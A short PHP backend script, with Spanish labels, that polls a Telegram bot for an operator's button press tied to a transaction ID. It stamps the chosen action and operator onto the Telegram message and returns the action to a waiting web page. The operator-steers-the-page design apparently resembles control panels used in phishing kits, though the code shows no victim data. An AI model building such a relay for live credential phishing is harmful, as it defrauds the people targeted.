<?php
session_start();
header('Content-Type: application/json');

$config = require __DIR__ . '/../../config.php';

$transactionId = $_POST['transactionId'] ?? $_POST['session_id'] ?? '';
$messageId     = $_POST['messageId'] ?? '';

if (empty($transactionId) || empty($messageId)) {
    echo json_encode(['status' => 'error', 'message' => 'Datos incompletos']);
    exit;
}

$offset = $_SESSION['last_update_id'] ?? 0;

$ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

$data = json_decode($response, true);
$action = null;

if (!empty($data['result'])) {
    foreach ($data['result'] as $update) {

        $_SESSION['last_update_id'] = $update['update_id'];

        if (!isset($update['callback_query']['data'])) continue;
        if (strpos($update['callback_query']['data'], $transactionId) === false) continue;

        list($actionType) = explode(":", $update['callback_query']['data']);
        $action = $actionType;

        // Human readable
        $accionHumana = ucfirst(str_replace("_", " ", $actionType));

        $oper = $update['callback_query']['from']['username']
            ?? $update['callback_query']['from']['first_name']
            ?? 'Desconocido';

        $oldText = $update['callback_query']['message']['text'] ?? '';

        $newText = $oldText .
            "\n\n<b>✅ Acción:</b> {$accionHumana}" .
            "\n<b>👤 Operador:</b> @{$oper}";

        $payload = [
            'chat_id' => $config['chat_id'],
            'message_id' => $messageId,
            'text' => $newText,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];

        $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_exec($ch);
        curl_close($ch);

        break;
    }
}

echo json_encode(['action' => $action]);
